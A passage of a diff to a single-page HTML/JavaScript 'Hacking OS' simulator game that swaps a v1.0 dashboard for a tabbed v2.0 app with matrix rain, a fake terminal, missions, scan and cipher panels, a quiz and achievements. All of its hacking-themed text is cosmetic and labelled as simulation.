+    text-align:center;border-radius:4px;
+    transition:all 0.3s;
+  }
+  .ach-item.unlocked{
+    border-color:var(--neon);
+    background:var(--card);
+    box-shadow:0 0 8px rgba(0,255,65,0.2);
+  }
+  .ach-item.locked{opacity:0.4;filter:grayscale(1);}
+  .ach-icon{font-size:24px;margin-bottom:6px;}
+  .ach-name{font-size:10px;letter-spacing:1px;color:var(--text-dim);}
+  .ach-item.unlocked .ach-name{color:var(--neon);}
+
+  /* ===== STATS WIDGETS ===== */
+  .stat-widget{
+    border:1px solid var(--border);padding:16px;
+    border-radius:4px;text-align:center;
+    background:var(--card);
+  }
+  .stat-widget-val{
+    font-size:clamp(24px,5vw,36px);font-weight:900;
+    text-shadow:var(--glow);
+  }
+  .stat-widget-label{font-size:10px;color:var(--text-dim);letter-spacing:2px;margin-top:4px;}
+
+  /* ===== ANIMATIONS ===== */
+  @keyframes fadeIn{from{opacity:0;transform:translateY(4px);}to{opacity:1;transform:none;}}
+  @keyframes pulse{0%,100%{text-shadow:var(--glow);}50%{text-shadow:0 0 5px var(--neon);}}
+  @keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+  @keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}  }
+  @keyframes glitch{
+    0%{transform:none;clip-path:none;}
+    20%{transform:translate(-2px,1px);clip-path:polygon(0 10%,100% 10%,100% 40%,0 40%);}
+    40%{transform:translate(2px,-1px);clip-path:polygon(0 60%,100% 60%,100% 90%,0 90%);}
+    60%{transform:none;clip-path:none;}
+  }
+  @keyframes scanline{
+    0%{top:-20%;}100%{top:120%;}
+  }
+  .scanline{
+    position:fixed;width:100%;height:3px;
+    background:linear-gradient(180deg,transparent,rgba(0,255,65,0.03),transparent);
+    animation:scanline 4s linear infinite;
+    pointer-events:none;z-index:2;
+  }
+
+  /* ===== TOAST ===== */
+  #toast{
+    position:fixed;bottom:20px;right:20px;
+    background:rgba(0,10,0,0.95);border:1px solid var(--neon);
+    padding:12px 18px;font-size:12px;letter-spacing:1px;
+    box-shadow:var(--glow);z-index:9998;
+    transform:translateY(100px);opacity:0;
+    transition:all 0.4s;border-radius:4px;max-width:280px;
+  }
+  #toast.show{transform:none;opacity:1;}
+
+  /* ===== MINI MAP ===== */
+  .mini-map{
+    width:100%;height:120px;background:#000;
+    border:1px solid var(--border);border-radius:4px;
+    position:relative;overflow:hidden;
+  }
+  .map-node{
+    position:absolute;width:8px;height:8px;
+    border-radius:50%;background:var(--neon);
+    box-shadow:var(--glow);
+    animation:blink 2s infinite;
+  }
+  .map-line{
+    position:absolute;height:1px;
+    background:rgba(0,255,65,0.2);
+    transform-origin:left center;
+  }
+
+  /* ===== RESPONSIVE ===== */
+  @media(max-width:480px){
+    .topbar-brand{font-size:14px;letter-spacing:2px;}
+    .tab-btn{padding:5px 10px;font-size:9px;}
+    .card{padding:12px;}
+  }
 </style>
 </head>
 <body>
 
-<canvas id="matrix-canvas"></canvas>
+<!-- Scanline overlay -->
+<div class="scanline"></div>
 
-<!-- ═══ BOOT SCREEN ═══ -->
-<div id="boot-screen">
-  <div>
-    <div class="boot-logo">HACKING OS</div>
-    <div class="boot-sub" style="margin-top:10px; text-align:center;">CYBERSECURITY OPERATIONS PLATFORM v1.0</div>
-  </div>
-  <div class="boot-loading">
-    <div class="boot-loading-label">
-      <span>SYSTEM INITIALIZATION</span>
+<!-- Matrix Rain -->
+<canvas id="matrix"></canvas>
+
+<!-- Toast -->
+<div id="toast">🔓 Achievement Unlocked!</div>
+
+<!-- Boot Screen -->
+<div id="boot">
+  <div class="boot-logo">HACKING OS</div>
+  <div class="boot-sub">SIMULATOR v2.0 — EDUCATIONAL ONLY</div>
+  <div class="boot-bar-wrap">
+    <div class="boot-bar-label">
+      <span id="boot-status">INITIALIZING...</span>
       <span id="boot-pct">0%</span>
     </div>
-    <div class="boot-bar-track">
-      <div class="boot-bar-fill" id="boot-bar"></div>
-    </div>
-  </div>
-  <div class="boot-messages" id="boot-msgs"></div>
-</div>
-
-<!-- ═══ TASKBAR ═══ -->
-<div id="taskbar">
-  <div class="taskbar-left">⬡ HackingOS v1.0</div>
-  <div class="taskbar-center">
-    <div class="status-dot"></div>
-    CONNECTION: SECURE (TOR ROUTED)
-  </div>
-  <div class="taskbar-right" id="clock">00:00:00</div>
-</div>
-
-<!-- ═══ DASHBOARD ═══ -->
-<div id="dashboard">
-
-  <!-- LEFT PANEL -->
-  <div class="panel" id="left-panel">
-    <div class="panel-titlebar">
-      <span class="panel-title">◈ SYSTEM MONITOR</span>
-      <div class="window-btns">
-        <div class="wb wb-close"></div>
-        <div class="wb wb-min"></div>
-        <div class="wb wb-max"></div>
-      </div>
-    </div>
-    <div class="panel-body" style="overflow-y:auto;">
-      <div class="mini-stats">
-        <div class="mini-stat-box">
-          <span class="mini-stat-val" id="cpu-val">--</span>
-          <span class="mini-stat-lbl">CPU CORES</span>
-        </div>
-        <div class="mini-stat-box">
-          <span class="mini-stat-val" id="thread-val">--</span>
-          <span class="mini-stat-lbl">THREADS</span>
-        </div>
-        <div class="mini-stat-box">
-          <span class="mini-stat-val" id="procs-val">--</span>
-          <span class="mini-stat-lbl">PROCS</span>
-        </div>
-        <div class="mini-stat-box">
-          <span class="mini-stat-val" id="packets-val">--</span>
-          <span class="mini-stat-lbl">PACKETS/s</span>
-        </div>
-      </div>
-
-      <div class="stat-block">
-        <div class="stat-label">CPU LOAD <span id="cpu-pct">0%</span></div>
-        <div class="stat-bar-track"><div class="stat-bar-fill bar-green" id="cpu-bar" style="width:0%"></div></div>
-      </div>
-      <div class="stat-block">
-        <div class="stat-label">RAM USAGE <span id="ram-pct">0%</span></div>
-        <div class="stat-bar-track"><div class="stat-bar-fill bar-cyan" id="ram-bar" style="width:0%"></div></div>
-      </div>
-      <div class="stat-block">
-        <div class="stat-label">DISK I/O <span id="disk-pct">0%</span></div>
-        <div class="stat-bar-track"><div class="stat-bar-fill bar-yellow" id="disk-bar" style="width:0%"></div></div>
-      </div>
-      <div class="stat-block">
-        <div class="stat-label">NET TRAFFIC <span id="net-pct">0 KB/s</span></div>
-        <div class="stat-bar-track"><div class="stat-bar-fill bar-red" id="net-bar" style="width:0%"></div></div>
-      </div>
-
-      <div class="stat-block" style="margin-top:14px;">
-        <div class="stat-label">NETWORK TRAFFIC GRAPH</div>
-        <canvas id="net-graph" height="80"></canvas>
-      </div>
-
-      <div class="ip-list">
-        <div style="color:var(--text-dim); font-size:9px; letter-spacing:0.2em; margin-bottom:4px;">ACTIVE CONNECTIONS</div>
-        <div class="ip-item"><span>192.168.1.105</span><span class="status-ok">● ACT</span></div>
-        <div class="ip-item"><span>10.0.0.23</span><span class="status-warn">● LAT</span></div>
-        <div class="ip-item"><span>172.16.254.1</span><span class="status-ok">● ACT</span></div>
-        <div class="ip-item"><span id="dyn-ip-1">45.33.32.156</span><span class="status-ok">● TOR</span></div>
-        <div class="ip-item"><span id="dyn-ip-2">198.41.0.4</span><span class="status-warn">● FWL</span></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- CENTER PANEL (TERMINAL) -->
-  <div class="panel" id="center-panel" style="display:flex; flex-direction:column;">
-    <div class="panel-titlebar">
-      <span class="panel-title">▶ ROOT@HACKINGOS:~# — MAIN TERMINAL</span>
-      <div class="window-btns">
-        <div class="wb wb-close"></div>
-        <div class="wb wb-min"></div>
-        <div class="wb wb-max"></div>
-      </div>
-    </div>
-    <div id="terminal-output"></div>
-    <div class="terminal-input-area">
-      <span class="prompt-text">root@hackingos:~$</span>
-      <div id="typing-display"></div>
-      <span class="cursor-blink"></span>
-    </div>
-  </div>
-
-  <!-- RIGHT PANEL -->
-  <div class="panel" id="right-panel">
-    <div class="panel-titlebar">
-      <span class="panel-title">⬡ DECRYPTION ENGINE</span>
-      <div class="window-btns">
-        <div class="wb wb-close"></div>
-        <div class="wb wb-min"></div>
-        <div class="wb wb-max"></div>
-      </div>
-    </div>
-    <div class="panel-body" style="overflow-y:auto;">
-      <div style="font-size:10px; color:var(--text-dim); letter-spacing:0.2em; margin-bottom:10px;">PASSWORD MATRIX DECRYPTION</div>
-      <div class="decrypt-matrix" id="decrypt-matrix"></div>
-
-      <div class="fw-section">
-        <div style="font-size:10px; color:var(--text-dim); letter-spacing:0.2em; margin-bottom:10px;">FIREWALL BYPASS PROGRESS</div>
-        <div id="fw-bars"></div>
-      </div>
-
-      <div style="margin-top:16px;">
-        <div style="font-size:10px; color:var(--text-dim); letter-spacing:0.2em; margin-bottom:8px;">EXPLOIT DATABASE</div>
-        <div id="exploit-list" style="font-size:10px; color: var(--text-dim); line-height:1.9;"></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- ACTION BUTTONS ROW -->
-  <div class="action-btns">
-    <button class="action-btn btn-attack" onclick="showPopup('attack')"><span>⚡ Execute Cyber Attack</span></button>
-    <button class="action-btn btn-decrypt" onclick="showPopup('decrypt')"><span>⬡ Decrypt Database</span></button>
-    <button class="action-btn" onclick="clearLogs()"><span>✕ Clear Logs</span></button>
-    <button class="action-btn btn-clear" onclick="showPopup('rootkit')"><span>◈ Deploy Rootkit</span></button>
-    <button class="action-btn" style="border-color:#aa00ff; color:#aa00ff;" onclick="showPopup('granted')"><span>▶ SSH Brute Force</span></button>
+    <div class="boot-bar"><div class="boot-bar-fill" id="boot-fill"></div></div>
+    <div class="boot-log" id="boot-log"></div>
   </div>
 </div>
 
-<!-- POPUP -->
-<div id="popup-overlay">
-  <div class="popup-box" id="popup-box">
-    <span class="popup-icon" id="popup-icon">⚠</span>
-    <div class="popup-title" id="popup-title">WARNING</div>
-    <div class="popup-msg" id="popup-msg">Operation in progress...</div>
-    <button class="popup-close" id="popup-close" onclick="closePopup()">[ DISMISS ]</button>
+<!-- Main App -->
+<div id="app">
+  <!-- Topbar -->
+  <div class="topbar">
+    <div class="topbar-brand">⬡ HACKING OS</div>
+    <div class="topbar-right">
+      <div class="status-dot"></div>
+      <div class="topbar-time" id="clock">00:00:00</div>
+      <button class="sound-btn" id="soundBtn" onclick="toggleSound()">🔊 SFX: ON</button>
+    </div>
   </div>
-</div>
+
+  <!-- Nav Tabs -->
+  <div class="nav-tabs">
+    <button class="tab-btn active" onclick="switchTab('dashboard')">DASHBOARD</button>
+    <button class="tab-btn" onclick="switchTab('terminal')">TERMINAL</button>
+    <button class="tab-btn" onclick="switchTab('missions')">MISSIONS</button>
+    <button class="tab-btn" onclick="switchTab('scanner')">NET SCAN</button>
+    <button class="tab-btn" onclick="switchTab('decrypt')">DECRYPT</button>
+    <button class="tab-btn" onclick="switchTab('quiz')">QUIZ</button>
+    <button class="tab-btn" onclick="switchTab('achievements')">TROPHIES</button>
+  </div>
+
+  <!-- ===== DASHBOARD ===== -->
+  <div class="panel active" id="panel-dashboard">
+    <div class="grid-2" style="margin-bottom:16px;">
+      <!-- Profile Card -->
+      <div class="card">
+        <div class="card-title">OPERATOR PROFILE</div>
+        <div style="display:flex;flex-direction:column;align-items:center;text-align:center;padding:8px 0;">
+          <div class="profile-avatar">👾</div>
+          <div class="profile-name" id="p-name">GHOST_X</div>
+          <div class="profile-rank" id="p-rank">◈ SCRIPT KIDDIE</div>
+          <div style="margin-top:12px;width:100%;">
+            <div class="xp-label"><span>XP PROGRESS</span><span id="xp-display">0 / 500</span></div>
+            <div class="xp-bar"><div class="xp-fill" id="xp-fill" style="width:0%"></div></div>
+          </div>
+          <div style="margin-top:12px;width:100%;text-align:left;">
+            <div class="stat-row"><span class="stat-label">LEVEL</span><span class="stat-val" id="p-level">1</span></div>
+            <div class="stat-row"><span class="stat-label">MISSIONS</span><span class="stat-val" id="p-missions">0</span></div>
+            <div class="stat-row"><span class="stat-label">HACKS</span><span class="stat-val" id="p-hacks">0</span></div>
+            <div class="stat-row"><span class="stat-label">DECRYPTS</span><span class="stat-val" id="p-decrypts">0</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Stats -->
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div class="card">
+          <div class="card-title">SYSTEM STATUS</div>
+          <div class="grid-3">
+            <div class="stat-widget">
+              <div class="stat-widget-val" id="cpu-val">0%</div>
+              <div class="stat-widget-label">CPU</div>
+            </div>
+            <div class="stat-widget">
+              <div class="stat-widget-val" id="ram-val">0%</div>
+              <div class="stat-widget-label">RAM</div>
+            </div>
+            <div class="stat-widget">
+              <div class="stat-widget-val" id="net-val">0ms</div>
+              <div class="stat-widget-label">PING</div>
+            </div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-title">NETWORK MAP</div>
+          <div class="mini-map" id="mini-map"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Activity Feed -->
+    <div class="card">
+      <div class="card-title">ACTIVITY LOG</div>
+      <div id="activity-feed" style="font-size:11px;line-height:2;color:var(--text-dim);max-height:150px;overflow-y:auto;"></div>
+    </div>
+  </div>
+
+  <!-- ===== TERMINAL ===== -->
+  <div class="panel" id="panel-terminal">
+    <div class="card">
+      <div class="card-title">CYBER TERMINAL v3.1</div>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="t-dot r"></div>
+          <div class="t-dot y"></div>
+          <div class="t-dot g"></div>
+          <span style="margin-left:8px;font-size:10px;color:var(--text-dim);">root@hackingos:~#</span>
+        </div>
+        <div class="terminal-body" id="term-body">
+          <div class="t-line t-info">╔══════════════════════════════════════╗</div>
+          <div class="t-line t-info">║   HACKING OS TERMINAL v3.1 SIM       ║</div>
+          <div class="t-line t-info">║   ⚠  SIMULATION ONLY — NO REAL HACK  ║</div>
+          <div class="t-line t-info">╚══════════════════════════════════════╝</div>
+          <div class="t-line t-out">Type 'help' for available commands.</div>
+          <div class="t-line">&nbsp;</div>
+        </div>
+        <div class="terminal-input-row">
+          <span class="t-cursor">root@hackingos:~#</span>
+          <input class="terminal-input" id="term-input" type="text" autocomplete="off" spellcheck="false" placeholder="type command..." onkeydown="handleTermKey(event)">
+        </div>
+      </div>
+    </div>
+    <div class="card" style="margin-top:12px;">
+      <div class="card-title">COMMAND REFERENCE</div>
+      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:6px;font-size:11px;">
+        <div style="color:var(--neon2);">help <span style="color:var(--text-dim);">— list commands</span></div>
+        <div style="color:var(--neon2);">whoami <span style="color:var(--text-dim);">— identity</span></div>
+        <div style="color:var(--neon2);">scan &lt;ip&gt; <span style="color:var(--text-dim);">— port scan sim</span></div>
+        <div style="color:var(--neon2);">decrypt &lt;str&gt; <span style="color:var(--text-dim);">— decode sim</span></div>
+        <div style="color:var(--neon2);">ifconfig <span style="color:var(--text-dim);">— network info</span></div>
+        <div style="color:var(--neon2);">ls <span style="color:var(--text-dim);">— list files</span></div>
+        <div style="color:var(--neon2);">cat &lt;file&gt; <span style="color:var(--text-dim);">— read file</span></div>
+        <div style="color:var(--neon2);">ping &lt;host&gt; <span style="color:var(--text-dim);">— ping sim</span></div>
+        <div style="color:var(--neon2);">matrix <span style="color:var(--text-dim);">— toggle rain</span></div>
+        <div style="color:var(--neon2);">clear <span style="color:var(--text-dim);">— clear screen</span></div>
+        <div style="color:var(--neon2);">status <span style="color:var(--text-dim);">— system info</span></div>
+        <div style="color:var(--neon2);">xp <span style="color:var(--text-dim);">— show XP</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== MISSIONS ===== -->
+  <div class="panel" id="panel-missions">
+    <div class="grid-2">
+      <div>
+        <div class="card" style="margin-bottom:12px;">
+          <div class="card-title">ACTIVE MISSIONS</div>
+          <div id="missions-list"></div>
+        </div>
+      </div>
+      <div>
+        <div class="card">
+          <div class="card-title">MISSION STATS</div>
+          <div class="stat-row"><span class="stat-label">COMPLETED</span><span class="stat-val" id="m-completed">0</span></div>
+          <div class="stat-row"><span class="stat-label">IN PROGRESS</span><span class="stat-val" id="m-inprog">0</span></div>
+          <div class="stat-row"><span class="stat-label">TOTAL XP EARNED</span><span class="stat-val" id="m-xp">0</span></div>
+          <div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border);">
+            <div class="card-title">MISSION LOG</div>
+            <div id="mission-log" style="font-size:10px;line-height:2;color:var(--text-dim);max-height:150px;overflow-y:auto;"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== NETWORK SCANNER ===== -->
+  <div class="panel" id="panel-scanner">
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">NETWORK SCAN SIMULATOR</div>
+        <div style="font-size:11px;color:var(--text-dim);margin-bottom:12px;">
+          ⚠ This is a fictional simulation. No real network scanning is performed.
+        </div>
+        <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;">
+          <select id="scan-type" style="background:#000;border:1px solid var(--border);color:var(--neon);padding:6px 10px;font-family:inherit;font-size:11px;flex:1;">
+            <option value="quick">QUICK SCAN</option>
+            <option value="full">FULL SCAN</option>
+            <option value="stealth">STEALTH SCAN</option>
+            <option value="vuln">VULN CHECK</option>
+          </select>
+          <select id="scan-target" style="background:#000;border:1px solid var(--border);color:var(--neon);padding:6px 10px;font-family:inherit;font-size:11px;flex:1;">
+            <option>192.168.1.0/24</option>
+            <option>10.0.0.0/8</option>
+            <option>172.16.0.0/12</option>
+            <option>CUSTOM RANGE</option>
+          </select>
+        </div>
+        <div class="scan-output" id="scan-output">
+          <span style="color:var(--text-dim);">Select scan type and click START SCAN...</span>
+        </div>
+        <div style="margin-top:8px;">
+          <div style="height:4px;background:rgba(0,212,255,0.1);border-radius:2px;overflow:hidden;">
+            <div id="scan-prog" style="height:100%;width:0%;background:var(--neon2);transition:width 0.1s;"></div>
+          </div>
+        </div>
+        <button class="scan-btn" id="scan-btn" onclick="startScan()">▶ START SCAN</button>
+      </div>
+      <div class="card">
+        <div class="card-title">SCAN HISTORY</div>
+        <div id="scan-history" style="font-size:11px;line-height:2;color:var(--text-dim);max-height:300px;overflow-y:auto;">
+          <span>No scans performed yet...</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== DECRYPT ===== -->
+  <div class="panel" id="panel-decrypt">
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">DECRYPTION SIMULATOR</div>
+        <div style="font-size:11px;color:var(--text-dim);margin-bottom:12px;">
+          ⚠ Fictional cipher simulation for entertainment only.
+        </div>
+        <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap;">
+          <select id="cipher-type" style="background:#000;border:1px solid var(--border);color:var(--neon);padding:6px 10px;font-family:inherit;font-size:11px;flex:1;">
+            <option value="caesar">CAESAR CIPHER</option>
+            <option value="base64">BASE64 DECODE</option>
+            <option value="hex">HEX DECODE</option>
+            <option value="binary">BINARY DECODE</option>
+            <option value="custom">CUSTOM CIPHER</option>
+          </select>
+        </div>
+        <div class="decrypt-display" id="decrypt-display">
+          <span style="color:var(--text-dim);">AWAITING ENCRYPTED DATA...</span>
+        </div>
+        <div class="decrypt-progress"><div class="decrypt-fill" id="decrypt-fill"></div></div>
+        <div style="display:flex;justify-content:space-between;font-size:10px;color:var(--text-dim);margin-bottom:8px;">
+          <span id="decrypt-status">STATUS: IDLE</span>
+          <span id="decrypt-pct">0%</span>
+        </div>
+        <button class="decrypt-btn" id="decrypt-btn" onclick="startDecrypt()">🔓 INITIATE DECRYPTION</button>
+        <div id="decrypt-result" style="margin-top:12px;font-size:12px;min-height:30px;padding:8px;border:1px solid transparent;border-radius:2px;"></div>
+      </div>
+      <div class="card">
+        <div class="card-title">DECRYPT LOG</div>
+        <div id="decrypt-log" style="font-size:11px;line-height:2;color:var(--text-dim);max-height:280px;overflow-y:auto;">
+          <span>No decryptions yet...</span>
+        </div>
+        <div style="margin-top:12px;padding-top:12px;border-top:1px solid var(--border);">
+          <div class="card-title">CIPHER INFO</div>
+          <div id="cipher-info" style="font-size:11px;color:var(--text-dim);line-height:1.8;">Select a cipher type to see information.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== QUIZ ===== -->
+  <div class="panel" id="panel-quiz">
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">CYBER SECURITY QUIZ</div>
+        <div id="quiz-container">
+          <div id="quiz-q-num" style="font-size:10px;color:var(--text-dim);margin-bottom:8px;letter-spacing:2px;">QUESTION 1 / 10</div>
+          <div class="quiz-q" id="quiz-q"></div>
+          <div class="quiz-options" id="quiz-opts"></div>
+          <div class="quiz-feedback" id="quiz-feedback"></div>
+          <button class="quiz-next-btn" id="quiz-next" onclick="nextQuestion()" style="display:none;">NEXT QUESTION ▶</button>
+        </div>
+        <div id="quiz-end" style="display:none;text-align:center;padding:20px 0;">
+          <div style="font-size:11px;color:var(--text-dim);letter-spacing:3px;margin-bottom:8px;">FINAL SCORE</div>
+          <div class="quiz-score" id="quiz-final-score">0/10</div>
+          <div id="quiz-grade" style="margin-top:8px;font-size:14px;letter-spacing:2px;"></div>
+          <button class="quiz-next-btn" onclick="restartQuiz()" style="max-width:200px;margin:16px auto 0;">RESTART QUIZ</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">QUIZ STATS</div>
+        <div class="stat-row"><span class="stat-label">CURRENT STREAK</span><span class="stat-val" id="q-streak">0</span></div>
+        <div class="stat-row"><span class="stat-label">BEST STREAK</span><span class="stat-val" id="q-best">0</span></div>
+        <div class="stat-row"><span class="stat-label">TOTAL CORRECT</span><span class="stat-val" id="q-correct">0</span></div>
+        <div class="stat-row"><span class="stat-label">TOTAL WRONG</span><span class="stat-val" id="q-wrong">0</span></div>
+        <div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border);">
+          <div class="card-title">SCORE HISTORY</div>
+          <div id="quiz-history" style="font-size:11px;line-height:2;color:var(--text-dim);max-height:160px;overflow-y:auto;">No quizzes completed yet.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== ACHIEVEMENTS ===== -->
+  <div class="panel" id="panel-achievements">
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">ACHIEVEMENT BOARD</div>
+        <div class="ach-grid" id="ach-grid"></div>
+      </div>
+      <div class="card">
+        <div class="card-title">RANK PROGRESSION</div>
+        <div id="rank-list" style="font-size:12px;line-height:2.2;"></div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- end #app -->
 
 <script>
-// ═══════════════════════════════════════════
-// MATRIX RAIN BACKGROUND
-// ═══════════════════════════════════════════
-(function() {
-  const canvas = document.getElementById('matrix-canvas');
-  const ctx = canvas.getContext('2d');
-  let cols, drops;
+// ============================================================
+// GLOBAL STATE
+// ============================================================
+const state = {
+  xp: 0, level: 1, hacks: 0, decrypts: 0, missionsCompleted: 0,
+  quizStreak: 0, quizBestStreak: 0, quizCorrect: 0, quizWrong: 0,
+  quizHistory: [],
+  sound: true,
+  matrixVisible: true,
+  scanHistory: [],
+  decryptLog: [],
+  activityLog: [],
+  achievements: new Set(),
+  missionLog: [],
+  termHistory: [],
+  termHistIdx: -1
+};
 
-  function resize() {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    cols = Math.floor(canvas.width / 16);
-    drops = Array(cols).fill(1);
-  }
-  resize();
-  window.addEventListener('resize', resize);
-
-  const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF';
-
-  function drawMatrix() {
-    ctx.fillStyle = 'rgba(0,0,0,0.05)';
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = '#00ff00';
-    ctx.font = '14px monospace';
-    for (let i = 0; i < drops.length; i++) {
-      const char = chars[Math.floor(Math.random() * chars.length)];
-      ctx.fillText(char, i * 16, drops[i] * 16);
-      if (drops[i] * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
-      drops[i]++;
-    }
-  }
-  setInterval(drawMatrix, 50);
-})();
-
-// ═══════════════════════════════════════════
-// CLOCK
-// ═══════════════════════════════════════════
-function updateClock() {
-  const now = new Date();
-  const h = String(now.getHours()).padStart(2, '0');
-  const m = String(now.getMinutes()).padStart(2, '0');
-  const s = String(now.getSeconds()).padStart(2, '0');
-  document.getElementById('clock').textContent = `${h}:${m}:${s}`;
-}
-setInterval(updateClock, 1000);
-updateClock();
-
-// ═══════════════════════════════════════════
-// BOOT SEQUENCE
-// ═══════════════════════════════════════════
-const bootMessages = [
-  '[INIT] Loading kernel modules...',
-  '[INIT] Mounting encrypted volumes...',
-  '[NET]  Establishing Tor circuit... (3 hops)',
-  '[SEC]  Randomizing MAC address: DE:AD:BE:EF:CA:FE',
-  '[SEC]  Disabling system logs...',
-  '[NET]  VPN tunnel established: 45.33.32.156',
-  '[LOAD] Injecting payload modules...',
-  '[DB]   Loading exploit database v9.2...',
-  '[OK]   All systems nominal. Launching HackingOS...'
+const RANKS = [
+  {name:'SCRIPT KIDDIE',xp:0},
+  {name:'JUNIOR HACKER',xp:500},
+  {name:'CODE BREAKER',xp:1200},
+  {name:'BLACK HAT',xp:2500},
+  {name:'CYBER GHOST',xp:4500},
+  {name:'ZERO-DAY HUNTER',xp:7000},
+  {name:'SHADOW OPERATOR',xp:10000},
+  {name:'ELITE PHANTOM',xp:15000},
 ];
 
-let bootProgress = 0;
-const bootBar = document.getElementById('boot-bar');
+const ACHIEVEMENTS = [
+  {id:'first_scan',icon:'🔍',name:'FIRST SCAN'},
+  {id:'decrypt5',icon:'🔓',name:'5 DECRYPTS'},
+  {id:'quiz_perfect',icon:'🏆',name:'PERFECT QUIZ'},
+  {id:'mission3',icon:'🎯',name:'3 MISSIONS'},
+  {id:'level5',icon:'⚡',name:'LEVEL 5'},
+  {id:'terminal10',icon:'💻',name:'10 COMMANDS'},
+  {id:'streak5',icon:'🔥',name:'5 STREAK'},
+  {id:'xp1000',icon:'💎',name:'1000 XP'},
+  {id:'all_missions',icon:'👑',name:'ALL MISSIONS'},
+  {id:'night_owl',icon:'🦉',name:'NIGHT OWL'},
+  {id:'speed_run',icon:'⚡',name:'SPEED RUN'},
+  {id:'hacker_pro',icon:'🕶️',name:'HACKER PRO'},
+];
+
+let termCmdCount = 0;
+
+// ============================================================
+// MATRIX RAIN
+// ============================================================
+const canvas = document.getElementById('matrix');
+const ctx = canvas.getContext('2d');
+let cols, drops, matrixRunning = true;
+
+function initMatrix() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  cols = Math.floor(canvas.width / 16);
+  drops = Array(cols).fill(1);
+}
+
+function drawMatrix() {
+  if (!matrixRunning) return;
+  ctx.fillStyle = 'rgba(0,0,0,0.05)';
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  ctx.fillStyle = '#00ff41';
+  ctx.font = '14px Courier New';
+  drops.forEach((y, i) => {
+    const char = String.fromCharCode(0x30A0 + Math.random() * 96);
+    ctx.fillText(char, i * 16, y * 16);
+    if (y * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+    drops[i]++;
+  });
+}
+
+initMatrix();
+setInterval(drawMatrix, 50);
+window.addEventListener('resize', initMatrix);
+
+// ============================================================
+// BOOT SEQUENCE
+// ============================================================
+const bootLogs = [
+  'Loading kernel modules...',
+  'Initializing cryptographic subsystem...',
+  'Establishing VPN tunnels...',
+  'Loading network stack...',
+  'Mounting encrypted volumes...',
+  'Starting stealth protocols...',
+  'Loading exploit database (SIMULATED)...',
+  'Initializing AI core...',
+  'Bypassing firewall (SIMULATION)...',
+  'System integrity check... PASS',
+  'Loading mission database...',
+  'Establishing secure shell...',
+  'HACKING OS READY.',
+];
+
+const bootStatuses = [
+  'LOADING KERNEL','INIT CRYPTO','VPN CONNECT',
+  'NET STACK','MOUNT FS','STEALTH MODE',
+  'LOADING DB','AI CORE','FIREWALL SIM',
+  'INTEGRITY CHK','MISSIONS','SECURE SHELL','BOOT COMPLETE'
+];
+
+let bootIdx = 0;
+const bootFill = document.getElementById('boot-fill');
+const bootLog = document.getElementById('boot-log');
+const bootStatus = document.getElementById('boot-status');
 const bootPct = document.getElementById('boot-pct');
-const bootMsgsEl = document.getElementById('boot-msgs');
-let bootMsgIdx = 0;
 
 function bootStep() {
-  if (bootProgress >= 100) {
+  if (bootIdx >= bootLogs.length) {
     setTimeout(() => {
-      document.getElementById('boot-screen').style.transition = 'opacity 0.8s';
-      document.getElementById('boot-screen').style.opacity = '0';
+      document.getElementById('boot').classList.add('hidden');
       setTimeout(() => {
-        document.getElementById('boot-screen').style.display = 'none';
-        document.getElementById('dashboard').classList.add('visible');
-        initDashboard();
+        document.getElementById('boot').style.display = 'none';
+        document.getElementById('app').style.display = 'block';
+        initApp();
       }, 800);
     }, 400);
     return;
   }
-
-  const step = Math.random() * 8 + 3;
-  bootProgress = Math.min(100, bootProgress + step);
-  bootBar.style.width = bootProgress + '%';
-  bootPct.textContent = Math.floor(bootProgress) + '%';
-
-  if (bootMsgIdx < bootMessages.length && bootProgress > (bootMsgIdx + 1) * (100 / bootMessages.length)) {
-    const el = document.createElement('div');
-    el.className = 'boot-msg';
-    el.style.color = bootMessages[bootMsgIdx].includes('[OK]') ? '#00ff00' :
-                     bootMessages[bootMsgIdx].includes('[SEC]') ? '#ffcc00' : '#00aa00';
-    el.textContent = bootMessages[bootMsgIdx];
-    bootMsgsEl.appendChild(el);
-    bootMsgsEl.scrollTop = bootMsgsEl.scrollHeight;
-    bootMsgIdx++;
-  }
-
-  setTimeout(bootStep, 80 + Math.random() * 120);
-}
-setTimeout(bootStep, 600);
-
-// ═══════════════════════════════════════════
-// TERMINAL LOGS
-// ═══════════════════════════════════════════
-const hackLogs = [
-  { type: 'info', msg: 'Initializing multi-threaded port scanner on target range 192.168.0.0/24' },
-  { type: 'sys', msg: 'Loading nmap fingerprint database... 87,432 signatures loaded' },
-  { type: 'data', msg: 'PORT   STATE  SERVICE  VERSION' },
